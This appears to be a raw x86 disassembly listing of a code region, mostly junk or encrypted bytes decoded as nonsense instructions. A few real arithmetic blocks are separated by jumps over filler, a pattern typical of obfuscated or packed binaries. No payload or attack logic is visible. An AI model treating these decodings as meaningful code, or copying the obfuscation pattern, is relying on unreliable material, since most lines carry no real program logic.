  4115ff:	sub    al,0xea
  411601:	shl    BYTE PTR [esi-0x54],0xc1
  411605:	popf   
  411606:	gs addr16 inc esp
  411609:	mov    WORD PTR [eax+0x511c75a3],ss
  41160f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411610:	add    eax,0xc59cb9dc
  411615:	mov    ch,0x8e
  411617:	mov    DWORD PTR [ebx],eax
  411619:	(bad)  
  41161a:	jo     0x4115ee
  41161c:	stos   BYTE PTR es:[edi],al
  41161d:	sbb    ah,BYTE PTR ds:0x5da97d50
  411623:	mov    ebx,0xe5c1eb65
  411628:	xchg   esp,eax
  411629:	call   0x8a6e:0x4991bef1
  411630:	fadd   st(7),st
  411632:	and    eax,0x8fa10ab2
  411637:	push   esp
  411638:	in     eax,0x74
  41163a:	xchg   ebp,eax
  41163b:	nop
  41163c:	arpl   WORD PTR [ecx+0x49717970],sp
  411642:	adc    bl,bl
  411644:	mov    eax,ds:0xe0a68144
  411649:	sbb    eax,0x6193bf33
  41164e:	xor    ebx,DWORD PTR [ebx+edx*1]
  411651:	arpl   WORD PTR [esi],cx
  411653:	(bad)  
  411654:	xlat   BYTE PTR ds:[ebx]
  411655:	daa    
  411656:	int3   
  411657:	cmc    
  411658:	mov    dh,0x18
  41165a:	cmp    DWORD PTR [eax],ebp
  41165c:	jg     0x411618
  41165e:	out    dx,al
  41165f:	stc    
  411660:	cli    
  411661:	fs dec eax
  411663:	pusha  
  411664:	inc    BYTE PTR [ebp-0x3408ab44]
  41166a:	fldenv [eax+0x39f5a1df]
  411670:	scas   al,BYTE PTR es:[edi]
  411671:	pop    eax
  411672:	cmp    eax,0xabde9690
  411677:	ret    
  411678:	shl    BYTE PTR [eax],1
  41167a:	ins    BYTE PTR es:[edi],dx
  41167b:	mov    WORD PTR [edi-0xafeb15a],gs
  411681:	and    eax,0xb70f4c9f
  411686:	dec    esp
  411687:	jg     0x411708
  411689:	adc    ebp,eax
  41168b:	xor    bh,BYTE PTR [ebx+0x19]
  41168e:	dec    ebp
  41168f:	and    edx,DWORD PTR [eax]
  411691:	mov    eax,ds:0xdfc379e
  411696:	and    dl,BYTE PTR [ebx]
  411698:	sbb    BYTE PTR [edi+esi*2-0xc],0x30
  41169d:	cmp    BYTE PTR [esi+0x30],dl
  4116a0:	pop    ebp
  4116a1:	mov    ecx,esi
  4116a3:	xchg   esi,eax
  4116a4:	sub    al,0xb5
  4116a6:	inc    edx
  4116a7:	cmp    BYTE PTR [edx+0x7360bc16],bl
  4116ad:	push   es
  4116ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116af:	int    0x3c
  4116b1:	jecxz  0x411638
  4116b3:	arpl   di,sp
  4116b5:	push   es
  4116b6:	push   0x29
  4116b8:	mov    dl,0xfb
  4116ba:	inc    ebx
  4116bb:	lea    esi,[ebp-0x69]
  4116be:	(bad)
  4116c1:	ret    0x3bc
  4116c4:	mov    ?,WORD PTR [esi]
  4116c6:	sbb    DWORD PTR [ecx+0x781d47c5],esp
  4116cc:	fwait
  4116cd:	cli    
  4116ce:	mov    ch,0x1f
  4116d0:	hlt    
  4116d1:	ror    al,0x46
  4116d4:	sub    eax,0x644abff3
  4116d9:	add    DWORD PTR [edi+0x1c],ebx
  4116dc:	div    ebx
  4116de:	ret    
  4116df:	adc    edx,ebp
  4116e1:	cmp    al,0xf
  4116e3:	mov    esi,0xe47b5222
  4116e8:	mov    ebx,0xb539c03c
  4116ed:	ret    
  4116ee:	pop    ds
  4116ef:	or     eax,0x602ed47d
  4116f4:	pop    ds
  4116f5:	repnz push cs
  4116f7:	shl    esp,cl
  4116f9:	xchg   edx,eax
  4116fa:	push   edi
  4116fb:	adc    BYTE PTR [eax],dl
  4116fd:	iret   
  4116fe:	sbb    BYTE PTR [esi+0x2c],al
  411701:	je     0x41170c
  411703:	sbb    eax,0x7e41f27e
  411708:	mov    ebp,0x51f81f01
  41170d:	jmp    DWORD PTR [esi+eiz*1+0x49c338f1]
  411714:	dec    edx
  411715:	mov    edx,0x85e1ecad
  41171a:	inc    ebx
  41171b:	sbb    al,0xdc
  41171d:	mov    bh,0x57
  41171f:	jo     0x411795
  411721:	adc    BYTE PTR [eax+ebp*4],ah
  411724:	cmp    al,0x71
  411726:	aaa    
  411727:	and    eax,0xf2f85e09
  41172c:	pop    esp
  41172d:	jbe    0x41174a
  41172f:	xchg   esi,eax
  411730:	int    0x96
  411732:	pop    ebx
  411733:	les    esp,FWORD PTR [ebx+0x290e0155]
  411739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41173a:	push   0x22
  41173c:	xor    BYTE PTR [ebp+0x77],bl
  41173f:	adc    DWORD PTR [ebx],eax
  411741:	cmp    esp,ecx
  411743:	dec    edi
  411744:	in     al,0x99
  411746:	and    ecx,0xf1a59ca2
  41174c:	iret   
  41174d:	jo     0x41174d
  41174f:	fnstsw WORD PTR [ecx-0x2a2be650]
  411755:	les    edx,FWORD PTR [ebx-0x6daa58a9]
  41175b:	sbb    al,0xe9
  41175d:	int3   
  41175e:	add    esi,DWORD PTR [ebp-0x25]
  411761:	lss    esi,FWORD PTR [eax-0x662d31d2]
  411768:	shr    BYTE PTR [ebp-0x43],1
  41176b:	xlat   BYTE PTR ds:[ebx]
  41176c:	mov    eax,ds:0xe3483613
  411771:	scas   al,BYTE PTR es:[edi]
  411772:	xor    edx,0xffffffe4
  411775:	dec    ebx
  411776:	retf   
  411777:	jnp    0x4117e3
  411779:	xor    cl,BYTE PTR [ebx+0x7037dbd6]
  41177f:	pop    ss
  411780:	xor    al,BYTE PTR [edi-0xf]
  411783:	sahf   
  411784:	pop    edi
  411785:	in     eax,0x8b
  411787:	push   ebp
  411788:	shr    cl,1
  41178a:	call   0x8b411796
  41178f:	push   ebp
  411790:	enter  0x7d8b,0xfc
  411794:	xor    edx,eax
  411796:	xor    edi,eax
  411798:	add    edi,ecx
  41179a:	add    edx,ecx
  41179c:	imul   edx,edi
  41179f:	mov    edi,DWORD PTR [ebp-0x8]
  4117a2:	jmp    0x411a2a
  4117a7:	iret   
  4117a8:	leave  
  4117a9:	into   
  4117aa:	xlat   BYTE PTR ds:[ebx]
  4117ab:	fcmovu st,st(3)
  4117ad:	aad    0xc9
  4117af:	cli    
  4117b0:	je     0x411765
  4117b2:	sti    
  4117b3:	push   0x20
  4117b5:	jne    0x41178f
  4117b7:	and    al,0x62
  4117b9:	js     0x411833
  4117bb:	in     eax,0x7e
  4117bd:	js     0x411837
  4117bf:	js     0x41175e
  4117c1:	xchg   ecx,eax
  4117c2:	push   0x3f
  4117c4:	jno    0x4117e7
  4117c6:	sub    eax,edx
  4117c8:	xchg   BYTE PTR [ecx-0x37fb35f8],dh
  4117ce:	out    dx,eax
  4117cf:	outs   dx,BYTE PTR ds:[esi]
  4117d0:	iret   
  4117d1:	push   ds
  4117d2:	jno    0x411835
  4117d4:	push   edx
  4117d5:	sub    edi,0x9f88dc22
  4117db:	jns    0x4117ba
  4117dd:	out    dx,al
  4117de:	inc    edi
  4117df:	inc    esp
  4117e0:	test   eax,0x4dedacb2
  4117e5:	xor    al,dh
  4117e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117e8:	(bad)  
  4117e9:	sbb    BYTE PTR ds:0x31efad7a,bh
  4117ef:	xor    BYTE PTR [esi+0x6],dl
  4117f2:	and    eax,0xf12529ab
  4117f7:	jmp    0xffc2:0x88dd1721
  4117fe:	cdq    
  4117ff:	xor    edi,DWORD PTR [ebp-0x28a9cf9f]
  411805:	mov    ecx,0xc929f63a
  41180a:	bound  edx,QWORD PTR [edi-0x6e2d36eb]
  411810:	aaa    
  411811:	dec    esi
  411812:	rol    BYTE PTR [esi-0x52],0xa2
  411816:	mov    eax,ds:0xa122895f
  41181b:	pop    ebx
  41181c:	ds push 0x23
  41181f:	mov    ebx,0x4b7b709b
  411824:	out    0x87,eax
  411826:	sbb    DWORD PTR [esp+edi*2],0x1b
  41182a:	mov    eax,0x96756748
  41182f:	sbb    ecx,DWORD PTR [ecx+eax*2+0x12]
  411833:	(bad)  
  411834:	stc    
  411835:	pop    ds
  411836:	int3   
  411837:	scas   eax,DWORD PTR es:[edi]
  411838:	cs lahf 
  41183a:	push   ebx
  41183b:	lock outs dx,BYTE PTR ds:[esi]
  41183d:	stos   DWORD PTR es:[edi],eax
  41183e:	(bad)  
  41183f:	arpl   WORD PTR [eax],cx
  411841:	xchg   edi,eax
  411842:	scas   al,BYTE PTR es:[edi]
  411843:	test   DWORD PTR [edi+ecx*2+0x8],ecx
  411847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411848:	call   0x51f62103
  41184d:	int3   
  41184e:	ja     0x411872
  411850:	enter  0x8c,0xf2
  411854:	sbb    DWORD PTR [ebp-0x66b3c07d],ecx
  41185a:	dec    edi
  41185b:	scas   al,BYTE PTR es:[edi]
  41185c:	sbb    bh,bl
  41185e:	and    al,BYTE PTR [eax+0x49fd4269]
  411864:	mov    cl,0xce
  411866:	aam    0x3
  411868:	or     al,0xe3
  41186a:	mov    ebx,0xbe4f7b5b
  41186f:	imul   esp,DWORD PTR [eax+0x18699d02],0x3a
  411876:	jl     0x411844
  411878:	repnz stos BYTE PTR es:[edi],al
  41187a:	cmp    al,dh
  41187c:	jg     0x411841
  41187e:	push   0x6569e0da
  411883:	or     esp,DWORD PTR [edi]
  411885:	in     eax,dx
  411886:	(bad)  
  411887:	int3   
  411888:	aad    0xa3
  41188a:	sub    BYTE PTR [edx],dh
  41188c:	outs   dx,BYTE PTR ds:[esi]
  41188d:	stos   BYTE PTR es:[edi],al
  41188e:	xchg   esi,eax
  41188f:	push   edx
  411890:	mov    ebp,0x166383d0
  411896:	in     eax,0x9
  411898:	daa    
  411899:	(bad)  
  41189d:	mov    es,WORD PTR [ecx+0x740d1e31]
  4118a3:	xchg   edi,eax
  4118a4:	int    0x62
  4118a6:	ja     0x411854
  4118a8:	mov    ds:0x58f5d4d1,al
  4118ad:	mov    dl,BYTE PTR [eax+esi*8+0x4c]
  4118b1:	(bad)  
  4118b2:	adc    DWORD PTR ss:[ebp+edi*1-0x12],eax
  4118b7:	loop   0x4118e4
  4118b9:	mov    esi,0xa3462901
  4118be:	and    al,al
  4118c0:	dec    ebp
  4118c1:	push   ebx
  4118c2:	lea    ecx,[edi-0x51]
  4118c5:	cmp    al,0xa8
  4118c7:	(bad)  
  4118c8:	mov    bl,0xc3
  4118ca:	mov    ebx,0xa5c2f90f
  4118cf:	jmp    0x6a79e703
  4118d4:	lods   al,BYTE PTR cs:[esi]
  4118d6:	ins    BYTE PTR es:[edi],dx
  4118d7:	sub    al,0xa2
  4118d9:	cld    
  4118da:	jbe    0x41191f
  4118dc:	push   esp
  4118dd:	inc    ecx
  4118de:	jle    0x4118dd
  4118e0:	loopne 0x411908
  4118e2:	add    esi,DWORD PTR [ebp-0x9]
  4118e5:	cli    
  4118e6:	and    dl,ah
  4118e8:	mov    cl,0x6c
  4118ea:	sbb    eax,0x8cb00c5c
  4118ef:	pusha  
  4118f0:	ss repz lahf 
  4118f3:	dec    ecx
  4118f4:	pop    esp
  4118f5:	loopne 0x411933
  4118f7:	dec    ebp
  4118f8:	sub    al,0xa
  4118fa:	or     edx,DWORD PTR [ebp+0x23]
  4118fd:	and    edi,edi
  4118ff:	mov    ds:0x754b70ec,eax
  411904:	sub    eax,0x4997cac4
  411909:	mov    BYTE PTR [esi-0x30a07063],dh
  41190f:	mov    esp,0x803b274a
  411914:	adc    ch,BYTE PTR fs:[ecx-0x711377da]
  41191b:	mov    DWORD PTR [ebx],edx
  41191d:	add    esp,edi
  41191f:	cmp    eax,0xe1819889
  411924:	cmp    ah,BYTE PTR [ecx-0x178214f]
  41192a:	fwait
  41192b:	xchg   DWORD PTR [eax+0x1583d5cb],ebx
  411931:	in     al,dx
  411932:	pop    eax
  411933:	or     eax,0xb9963931
  411938:	xor    al,0x2f
  41193a:	or     DWORD PTR [edi+0x52c06658],edx
  411940:	cmp    eax,DWORD PTR [eax+0x26]
  411943:	inc    edi
  411944:	dec    ebp
  411945:	or     BYTE PTR [edx*4+0x63648aad],al
  41194c:	push   ds
  41194d:	loop   0x4118e2
  41194f:	out    dx,al
  411950:	in     eax,dx
  411951:	cmp    al,0x9f
  411953:	ss jae 0x411912
  411956:	(bad)  
  411957:	aad    0x13
  411959:	(bad)  
  41195a:	xchg   edx,eax
  41195b:	xor    ah,BYTE PTR [eiz*8+0x724e3c52]
  411962:	test   BYTE PTR [esi+0x3220a54f],dl
  411968:	and    eax,0xbe2a9ac1
  41196d:	push   eax
  41196e:	enter  0x645a,0x7a
  411972:	mov    dl,dh
  411974:	mov    al,0x48
  411976:	cwde   
  411977:	mov    eax,DWORD PTR ds:0xcfc8a836
  41197d:	push   cs
  41197e:	outs   dx,BYTE PTR ds:[esi]
  41197f:	cmp    al,0x74
  411981:	outs   dx,DWORD PTR ds:[esi]
  411982:	mov    ds,WORD PTR [edi-0x398c4e2f]
  411988:	repz jo 0x411939
  41198b:	adc    eax,DWORD PTR [edi-0x54]
  41198e:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411990:	add    DWORD PTR [eax],edi
  411992:	leave  
  411993:	xchg   BYTE PTR [esp+ebx*8+0x259dbf9b],dl
  41199a:	push   edi
  41199b:	xlat   BYTE PTR ds:[ebx]
  41199c:	sahf   
  41199d:	jmp    0x3b4f:0xee1f4357
  4119a4:	jg     0x4119fc
  4119a6:	sbb    eax,0x949fa013
  4119ab:	das    
  4119ac:	xchg   DWORD PTR [ebp+0x1b],ecx
  4119af:	in     eax,dx
  4119b0:	sbb    DWORD PTR ds:0x19a2d246,esp
  4119b6:	rcl    edi,1
  4119b8:	icebp  
  4119b9:	retf   0xdb88
  4119bc:	sub    eax,0x5e025575
  4119c1:	pushf  
  4119c2:	fisttp QWORD PTR [esi-0x1197fb5b]
  4119c8:	(bad)  
  4119ca:	xchg   edi,eax
  4119cb:	int    0x22
  4119cd:	lock inc esi
  4119cf:	mov    al,0x1e
  4119d1:	push   ecx
  4119d2:	jb     0x4119a9
  4119d4:	aam    0x3e
  4119d6:	stc    
  4119d7:	mov    ch,0xdb
  4119d9:	pop    es
  4119da:	push   ecx
  4119db:	outs   dx,BYTE PTR ds:[esi]
  4119dc:	push   ss
  4119dd:	mov    DWORD PTR [edi],ecx
  4119df:	mov    al,0xa9
  4119e1:	jbe    0x4119e7
  4119e3:	dec    ebx
  4119e4:	jecxz  0x4119ee
  4119e6:	(bad)  
  4119e7:	sbb    ah,BYTE PTR [edx+0x14]
  4119ea:	mov    ah,0x71
  4119ec:	stos   BYTE PTR es:[edi],al
  4119ed:	popa   
  4119ee:	pop    eax
  4119ef:	cmp    BYTE PTR [esi-0x5b],al
  4119f2:	sar    BYTE PTR [edx+0x1c],cl
  4119f5:	push   eax
  4119f6:	pop    ebp
  4119f7:	popf   
  4119f8:	mov    ah,0x57
  4119fa:	mov    eax,ds:0xa2bf2bc9
  4119ff:	mov    dh,0x34
  411a01:	ror    dh,1
  411a03:	cdq    
  411a04:	pop    ds
  411a05:	adc    eax,0x35eed1b6
  411a0a:	inc    edx
  411a0b:	or     DWORD PTR [edx+0x6b],esp
  411a0e:	(bad)  
  411a0f:	fdivr  DWORD PTR [esi+0x68]
  411a12:	sbb    al,ch
  411a14:	jge    0x411a32
  411a16:	fs enter 0xc7,0x8c
  411a1b:	inc    ebx
  411a1c:	or     BYTE PTR [esi-0x5f],0xd0
  411a20:	aas    
  411a21:	dec    eax
  411a22:	pop    ebp
  411a23:	push   ebx
  411a24:	xchg   ecx,eax
  411a25:	jg     0x411a62
  411a27:	in     al,dx
  411a28:	sar    BYTE PTR [esi],cl
  411a2a:	mov    ebx,DWORD PTR [ebp-0x10]
  411a2d:	sub    ebx,edi
  411a2f:	cmp    ebx,edx
  411a31:	ja     0x411a3f
  411a37:	mov    edx,DWORD PTR [ebp-0x34]
  411a3a:	jmp    0x411f76
  411a3f:	mov    edx,DWORD PTR [ebp-0x3c]
  411a42:	mov    edi,DWORD PTR [ebp-0x4]
  411a45:	xor    edx,eax
  411a47:	xor    edi,eax
  411a49:	add    edx,ecx
  411a4b:	add    edi,ecx
  411a4d:	imul   edx,edi
  411a50:	jmp    0x411cd8
  411a55:	into   
  411a56:	(bad)  
  411a57:	cmp    al,0xc7
  411a59:	fxch   st(3)
  411a5b:	(bad)  
  411a5d:	sub    eax,0xc9d7da8b
  411a62:	(bad)  
  411a63:	or     eax,0x7860911e
  411a68:	js     0x411a4f
  411a6a:	jle    0x411ae4
  411a6c:	js     0x411ade
  411a6e:	aad    0x5f
  411a70:	or     eax,0x84fecf39
  411a75:	sti    
  411a76:	test   DWORD PTR [ebx],0xdecefb63
  411a7c:	inc    eax
  411a7d:	mov    al,0x24
  411a7f:	sub    DWORD PTR [eax+0x197d69d9],0xc4729610
  411a89:	fadd   DWORD PTR [ebx-0x61]
  411a8c:	inc    eax
  411a8d:	sbb    DWORD PTR [ecx-0x7cff988e],ebp
  411a93:	pop    ebx
  411a94:	sbb    ecx,DWORD PTR [ecx-0x1ec6433f]
  411a9a:	jns    0x411a5b
  411a9c:	pop    ss
  411a9d:	mov    eax,0x55e5f4ea
  411aa2:	xchg   edx,eax
  411aa3:	push   edx
  411aa4:	dec    eax
  411aa5:	push   edi
  411aa6:	xor    ebx,DWORD PTR [esp+ebp*8-0x5d]
  411aaa:	mov    esi,0x9f7ec6b
  411aaf:	inc    esp
  411ab0:	inc    esi
  411ab1:	jg     0x411aad
  411ab3:	(bad)  
  411ab4:	mov    cl,0xcd
  411ab6:	pop    ebx
  411ab7:	jmp    0x411ae2
  411ab9:	mov    bl,0xff
  411abb:	packssdw mm7,mm2
  411abe:	pop    ebp
  411abf:	in     al,dx
  411ac0:	jecxz  0x411acb
  411ac2:	outs   dx,DWORD PTR ds:[esi]
  411ac3:	iret   
  411ac4:	xor    eax,DWORD PTR [edx]
  411ac6:	call   0x69bd4d1d
  411acb:	pop    edx
  411acc:	and    eax,0x49e72367
  411ad1:	stos   BYTE PTR es:[edi],al
  411ad2:	in     eax,0xf9
  411ad4:	inc    esp
  411ad5:	icebp  
  411ad6:	hlt    
  411ad7:	lods   al,BYTE PTR ds:[esi]
  411ad8:	je     0x411b23
  411ada:	stos   DWORD PTR es:[edi],eax
  411adb:	dec    ebp
  411adc:	in     eax,dx
  411add:	cmp    ch,BYTE PTR [ebx-0x21c176db]
  411ae3:	cld    
  411ae4:	push   ss
  411ae5:	shl    BYTE PTR [eax],cl
  411ae7:	je     0x411a84
  411ae9:	dec    ecx
  411aea:	adc    DWORD PTR [ecx],0xd
  411aed:	hlt    
  411aee:	jns    0x411b6f
  411af0:	add    esi,DWORD PTR [ecx+edx*1]
  411af3:	fld    st(3)
  411af5:	mov    ch,al
  411af7:	mov    ebx,0xecf89c
  411afc:	ja     0x411b4e
  411afe:	aam    0x39
  411b00:	arpl   sp,di
  411b02:	mov    ebp,0xb7992ce3
  411b07:	jle    0x411b6e
  411b09:	mov    ?,esp
  411b0b:	add    dh,BYTE PTR [edx+0x56512c5a]
  411b11:	lods   eax,DWORD PTR ds:[esi]
  411b12:	test   al,0xcc
  411b14:	mov    eax,0x26dd358f
  411b19:	fidiv  WORD PTR [edx]
  411b1b:	sub    esp,DWORD PTR [ebx+0x16]
  411b1e:	call   0x1c0c04b1
  411b23:	pop    es
  411b24:	jbe    0x411abe
  411b26:	dec    ebx
  411b27:	dec    edx
  411b28:	jmp    0x7f121147
  411b2d:	cmp    BYTE PTR [ecx-0x77],bl
  411b30:	ret    
  411b31:	cmp    eax,0x15741efe
  411b36:	ins    BYTE PTR es:[edi],dx
  411b37:	cs repnz out dx,eax
  411b3a:	pop    edx
  411b3b:	imul   DWORD PTR [eax-0x2b]
  411b3e:	mov    ebx,0xacd27b07
  411b43:	in     eax,dx
  411b44:	and    eax,DWORD PTR [ecx]
  411b46:	cld    
  411b47:	xchg   esp,eax
  411b48:	mov    DWORD PTR [ecx],esp
  411b4a:	mov    BYTE PTR [edi+0x2899452e],dh
  411b50:	sbb    cl,BYTE PTR [ebx-0x12]
  411b53:	jae    0x411bb4
  411b55:	or     eax,DWORD PTR [ebx+esi*8-0x7556d6b8]
  411b5c:	and    DWORD PTR [edi-0x30],ecx
  411b5f:	cmp    DWORD PTR [ebx+0x26],eax
  411b62:	retf   0xa3d2
  411b65:	mov    esi,0xdc7f8e00
  411b6a:	jl     0x411b07
  411b6c:	cmp    eax,0x5aefd022
  411b71:	mov    gs,WORD PTR [edi+0x6]
  411b74:	push   eax
  411b75:	loopne 0x411b92
  411b77:	inc    ebp
  411b78:	in     eax,dx
  411b79:	hlt    
  411b7a:	out    dx,eax
  411b7b:	dec    edi
  411b7c:	cmc    
  411b7d:	aas    
  411b7e:	daa    
  411b7f:	add    eax,0x6deddd7a
  411b84:	or     al,0x66
  411b86:	mov    edi,0xcec2fc9f
  411b8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b8c:	(bad)  
  411b8d:	fwait
  411b8e:	(bad)  
  411b8f:	jne    0x411b6c
  411b91:	xor    BYTE PTR [ebp+edi*1-0x1a659a3f],bl
  411b98:	pop    ss
  411b99:	mov    WORD PTR [esi-0x20],ds
  411b9c:	shl    BYTE PTR [ebp-0x1b],1
  411b9f:	sbb    dh,BYTE PTR [esp+ebp*1+0x31f88b27]
  411ba6:	mov    esi,0x53cfddbf
  411bab:	popf   
  411bac:	jb     0x411b47
  411bae:	sti    
  411baf:	dec    ebx
  411bb0:	and    eax,0x3b89ef2
  411bb5:	lods   al,BYTE PTR ds:[esi]
  411bb6:	adc    edx,edx
  411bb8:	or     DWORD PTR [edi],eax
  411bba:	push   0x19
  411bbc:	mov    esp,0xe5b1c9e8
  411bc1:	dec    edx
  411bc2:	fisttp QWORD PTR [ecx+0x22]
  411bc5:	inc    edx
  411bc6:	repnz mov DWORD PTR [ecx+0x54b21910],0x3badc5f9
  411bd1:	xchg   edi,eax
  411bd2:	je     0x411b57
  411bd4:	leave  
  411bd5:	call   0x7207:0x5338aa74
  411bdc:	mov    ecx,0x3105a0ea
  411be1:	fidiv  WORD PTR [eax+0x3d]
  411be4:	dec    esp
  411be5:	in     al,0x34
  411be7:	call   0x7d0c3a40
  411bec:	icebp  
  411bed:	mov    ecx,0x4650cf6a
  411bf2:	loopne 0x411c68
  411bf4:	sti    
  411bf5:	push   esp
  411bf6:	jmp    0x1675547b
  411bfb:	sub    DWORD PTR [eax-0x52],esp
  411bfe:	pop    esi
  411bff:	sub    DWORD PTR [ecx-0x13],esp
  411c02:	jge    0x411c73
  411c04:	js     0x411c62
  411c06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c07:	iret   
  411c08:	outs   dx,DWORD PTR ds:[esi]
  411c09:	mov    esp,0xae93639
  411c0e:	cmp    BYTE PTR [edx+eiz*8-0x38],0x6e
  411c13:	test   BYTE PTR [ecx+0x26],ah
  411c16:	pushw  cs
  411c18:	(bad)  
  411c19:	stc    
  411c1a:	int3   
  411c1b:	cdq    
  411c1c:	sbb    al,0xf8
  411c1e:	mov    BYTE PTR [esi+0x1834b6c],dl
  411c24:	inc    edi
  411c25:	mov    eax,ds:0xcc4ce4f5
  411c2a:	xor    eax,eax
  411c2c:	into   
  411c2d:	adc    bl,BYTE PTR [edx]
  411c2f:	push   ds
  411c30:	mov    ch,0x3c
  411c32:	xor    al,0xe6
  411c34:	rol    BYTE PTR [edx+eax*1],0x8
  411c38:	cld    
  411c39:	sbb    al,0x85
  411c3b:	push   ebx
  411c3c:	in     al,dx
  411c3d:	in     eax,dx
  411c3e:	sub    DWORD PTR [ecx-0x15f0483b],0xffffff82
  411c45:	sub    DWORD PTR [ecx-0x1d2c0dd2],edx
  411c4b:	sti    
  411c4c:	add    eax,0x58643496
  411c51:	mov    cl,0x24
  411c53:	aad    0xab
  411c55:	xor    BYTE PTR [ebx+0x53c66027],cl
  411c5b:	pushf  
  411c5c:	jns    0x411cdd
  411c5e:	mov    ah,0xe0
  411c60:	xchg   ebp,eax
  411c61:	fnstcw WORD PTR [ebx+0x2e]
  411c64:	jmp    0x411beb
  411c66:	jb     0x411cab
  411c68:	sbb    al,0xd0
  411c6a:	push   ss
  411c6b:	scas   eax,DWORD PTR es:[edi]
  411c6c:	sub    esp,DWORD PTR [ebx]
  411c6e:	mov    dl,0xb3
  411c70:	xor    DWORD PTR [ecx-0x5ca97238],edx
  411c76:	jnp    0x411c64
  411c78:	push   es
  411c79:	(bad)  
  411c7a:	neg    BYTE PTR [edi-0x7532c4f]
  411c80:	xor    DWORD PTR [esi],ebp
  411c82:	aad    0x87
  411c84:	pop    edi
  411c85:	xor    al,ch
  411c87:	inc    edi
  411c88:	and    al,0xa6
  411c8a:	sub    dl,BYTE PTR [esi+0x6b]
  411c8d:	fmul   st,st(7)
  411c8f:	mov    bl,0x77
  411c91:	int    0x33
  411c93:	adc    eax,0xdc0f094c
  411c98:	mov    ds:0xaacdb67d,al
  411c9d:	or     DWORD PTR [edx+eiz*8],esi
  411ca0:	xchg   edi,eax
  411ca1:	adc    bh,BYTE PTR [esi]
  411ca3:	or     ah,BYTE PTR [edx]
  411ca5:	xchg   esi,eax
  411ca6:	les    ebx,FWORD PTR [edx-0x26]
  411ca9:	repnz add al,0x7
  411cac:	(bad)  
  411cad:	mov    edx,DWORD PTR [eax-0x3]
  411cb0:	dec    ebx
  411cb1:	out    dx,eax
  411cb2:	mov    edx,0xbc3b23c6
  411cb7:	sbb    dh,ch
  411cb9:	fwait
  411cba:	retfw  0xb929
  411cbe:	push   ebp
  411cbf:	retf   0x7e5d
  411cc2:	push   0x1bf0a28a
  411cc7:	imul   edx,ecx,0x2c
  411cca:	add    ch,BYTE PTR [eax+0x35]
  411ccd:	pop    ebx
  411cce:	clc    
  411ccf:	lds    edx,FWORD PTR es:[eax]
  411cd2:	add    al,BYTE PTR [ebp+0x60]
  411cd5:	mov    ss,WORD PTR [eax-0x7827469]
  411cdb:	mov    ebx,DWORD PTR [ebp-0x10]
  411cde:	sub    ebx,edi
  411ce0:	cmp    ebx,edx
  411ce2:	mov    edx,DWORD PTR [ebp-0x38]
  411ce5:	jbe    0x411f76
  411ceb:	jmp    0x411f73
  411cf0:	rol    al,1
  411cf2:	(bad)  
  411cf3:	ds (bad) 
  411cf5:	into   
  411cf6:	rcl    dh,1
  411cf8:	adc    eax,0x3d66579e
  411cfd:	mov    ah,0x3a
  411cff:	inc    esp
  411d00:	jle    0x411d67
  411d02:	js     0x411d7c
  411d04:	in     eax,0x7e
  411d06:	js     0x411d80
  411d08:	ja     0x411cbc
  411d0a:	jmp    0x411ced
  411d0c:	and    al,0x61
  411d0e:	cmp    eax,0xd0c49b87
  411d13:	xor    bl,0x83
  411d16:	repz cld 
  411d18:	xchg   BYTE PTR [edx],cl
  411d1a:	push   ecx
  411d1b:	pop    edx
  411d1c:	out    dx,eax
  411d1d:	leave  
  411d1e:	mov    edx,0x7ec19755
  411d23:	mov    al,0x37
  411d25:	jmp    0x411d2d
  411d27:	mov    DWORD PTR [ebp+0x472c618e],0xc58cfb30
  411d31:	inc    DWORD PTR [edx-0x69]
  411d34:	in     al,dx
  411d35:	shl    DWORD PTR [eax+0x20],1
  411d38:	xchg   edx,eax
  411d39:	outs   dx,BYTE PTR ds:[esi]
  411d3a:	push   edx
  411d3b:	mov    edi,0x5c877f79
  411d40:	add    dh,al
  411d42:	pop    edi
  411d43:	lock dec ebp
  411d45:	loope  0x411d25
  411d47:	addr16 rcl ch,cl
  411d4a:	in     eax,dx
  411d4b:	jmp    0x411d68
  411d4d:	mov    bl,0x9e
  411d4f:	dec    ecx
  411d50:	hlt    
  411d51:	inc    esp
  411d52:	inc    ebp
  411d53:	sub    eax,0x10df4c9f
  411d58:	push   ebx
  411d59:	jnp    0x411db9
  411d5b:	in     al,0x9d
  411d5d:	out    dx,eax
  411d5e:	into   
  411d5f:	xor    WORD PTR fs:[eax-0x4],dx
  411d64:	inc    ebx
  411d65:	lods   eax,DWORD PTR ds:[esi]
  411d66:	pop    es
  411d67:	jle    0x411dab
  411d69:	mov    esp,0x9279f6ff
  411d6e:	sahf   
  411d6f:	cmp    edx,DWORD PTR [eax-0x64]
  411d72:	pop    ecx
  411d73:	out    dx,al
  411d74:	mov    ch,0x7e
  411d76:	mov    ebx,0x69b420fb
  411d7b:	push   esp
  411d7c:	mov    cl,0x8a
  411d7e:	gs push ecx
  411d80:	(bad)  
  411d82:	pop    esp
  411d83:	out    0x3c,eax
  411d85:	xchg   esi,eax
  411d86:	pusha  
  411d87:	xor    DWORD PTR [esp+ebx*8+0x6d666fd6],esp
  411d8e:	retf   0x13c8
  411d91:	out    dx,al
  411d92:	enter  0x761d,0xff
  411d96:	fisub  DWORD PTR ds:0x976cafcd
  411d9c:	dec    eax
  411d9d:	push   ss
  411d9e:	or     eax,eax
  411da0:	nop
  411da1:	jmp    0x34a7c13b
  411da6:	inc    esi
  411da7:	or     bl,BYTE PTR [ebx+0x6]
  411daa:	xchg   ebx,eax
  411dab:	aaa    
  411dac:	and    al,0x6
  411dae:	(bad)  
  411db0:	cmp    al,0xec
  411db2:	outs   dx,DWORD PTR ds:[esi]
  411db3:	mov    cl,0x3a
  411db5:	dec    ebp
  411db6:	call   0xa981:0xd99ea4d8
  411dbd:	dec    ecx
  411dbe:	test   bh,cl
  411dc0:	pusha  
  411dc1:	ins    DWORD PTR es:[edi],dx
  411dc2:	sbb    bl,BYTE PTR ds:0xcbb54c65
  411dc8:	add    esi,edx
  411dca:	in     al,0xbc
  411dcc:	jl     0x411dd3
  411dce:	je     0x411dfc
  411dd0:	cld    
  411dd1:	jg     0x411da6
  411dd3:	leave  
